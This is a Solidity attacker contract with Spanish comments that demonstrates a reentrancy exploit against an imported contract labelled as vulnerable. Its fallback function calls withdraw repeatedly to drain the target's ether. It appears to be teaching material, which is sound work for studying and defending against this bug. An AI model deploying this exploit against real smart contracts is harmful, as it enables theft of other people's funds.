// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "./Reentrancy.sol";

contract Caller {
    // una instancia del contrato vulnerable
    Reentrancy _reentrancy;

    constructor(address _contractAddr) {
        _reentrancy = Reentrancy(_contractAddr);
    }

    // fallback
    fallback() external payable {
        // condición de parada
        if (address(_reentrancy).balance >= 1 ether) {
            _reentrancy.withdraw();
        }
    }

    // una forma de empezar a interactuar con la victima
    function startAttack() external payable {
        require(msg.value >= 1 ether);

        _reentrancy.setBalance{value: msg.value}();
        _reentrancy.withdraw();
    }

    // funcionalidad de obtener el balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
